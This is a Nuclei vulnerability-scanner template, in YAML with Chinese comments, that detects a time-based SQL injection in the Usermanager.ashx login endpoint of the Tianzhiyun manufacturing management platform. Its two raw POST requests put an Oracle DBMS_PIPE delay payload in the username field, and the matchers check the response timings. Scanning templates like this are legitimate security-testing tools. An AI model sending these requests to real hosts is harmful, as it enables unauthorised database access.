id: tianzhiyun-Usermanager-sql-injection

info:
  name: 天智云智造管理平台 Usermanager.ashx SQL延时注入漏洞
  author: unknown
  severity: high
  description: |-
    body="Ashx/Usermanager.ashx"
    天智云智造管理平台 Usermanager.ashx 接囗处存在 SQL注入漏洞，未经授权攻击者可通过该漏洞获取数据库敏感信息，进一步利用可获取服务器权限，导致网站处于极度不安全状态。
  reference:
    - https://blog.csdn.net/m0_60571842/article/details/139512441
  tags: sql injection

http:
  - raw:
      - |
        POST /Ashx/Usermanager.ashx HTTP/1.1 #这里的GET为请求体1，请求1的延时设置为3
        Host: {{Hostname}}
        X-Requested-With: XMLHttpRequest
        Content-Type: application/x-www-form-urlencoded

        type=LOGIN&username=1') AND 8645=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110),3)--&pwd=1&vendor=

      - |
        POST /Ashx/Usermanager.ashx HTTP/1.1 #这里的GET为请求体2，请求2的延时设置为6
        Host: {{Hostname}}
        X-Requested-With: XMLHttpRequest
        Content-Type: application/x-www-form-urlencoded

        type=LOGIN&username=1') AND 8645=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110),6)--&pwd=1&vendor=

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
            - 'duration_1>=3 && duration_1<=4'  #请求1的延时>=3且<=4
            - 'duration_2>=6 && duration_2<=7'  #请求2的延时>=5且<=6
      - type: status
        status: 
          - 200





